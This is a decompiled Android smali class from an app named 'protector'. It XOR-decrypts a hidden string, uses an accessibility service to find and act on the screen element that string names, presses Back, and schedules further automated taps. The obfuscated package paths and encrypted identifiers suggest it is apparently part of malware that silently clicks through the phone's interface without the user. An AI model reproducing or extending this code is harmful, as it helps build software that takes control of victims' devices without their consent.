.class Lcom/icontrol/protector/m$g;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lcom/icontrol/protector/w$c;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m;->V0()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic c()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/m$g;->e()V

    return-void
.end method

.method public static synthetic d()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/m$g;->f()V

    return-void
.end method

.method private static synthetic e()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/icontrol/protector/m;->f0()V

    return-void
.end method

.method private static synthetic f()V
    .locals 4

    .line 1
    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/icontrol/protector/r;

    invoke-direct {v1}, Lcom/icontrol/protector/r;-><init>()V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method


# virtual methods
.method public a()V
    .locals 4

    .line 1
    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x2b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {v0}, Lcom/icontrol/protector/m;->l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/icontrol/protector/m;->a0(I)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/icontrol/protector/q;

    invoke-direct {v1}, Lcom/icontrol/protector/q;-><init>()V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_0
    return-void

    :array_0
    .array-data 1
        -0x4bt
        -0x68t
        0x46t
        0x44t
        0x4et
        0x41t
        -0x16t
        -0x48t
        -0x8t
        -0x7ct
        0x4et
        0x9t
        0x56t
        0x5at
        -0xat
        -0x5bt
        -0x51t
        -0x6ct
        0x4et
        0x4t
        0x57t
        0x4dt
        -0x13t
        -0x15t
        -0x41t
        -0x6dt
        0x4t
        0xbt
        0x4et
        0x77t
        -0x5t
        -0x4ct
        -0x5et
        -0x6at
        0x42t
        0x6t
        0x7ct
        0x43t
        -0x6t
        -0x4ct
        -0x5at
        -0x6et
        0x59t
    .end array-data

    :array_1
    .array-data 1
        -0x2at
        -0x9t
        0x2bt
        0x6at
        0x23t
        0x28t
        -0x61t
        -0x2ft
    .end array-data
.end method

.method public b()V
    .locals 0

    .line 1
    return-void
.end method
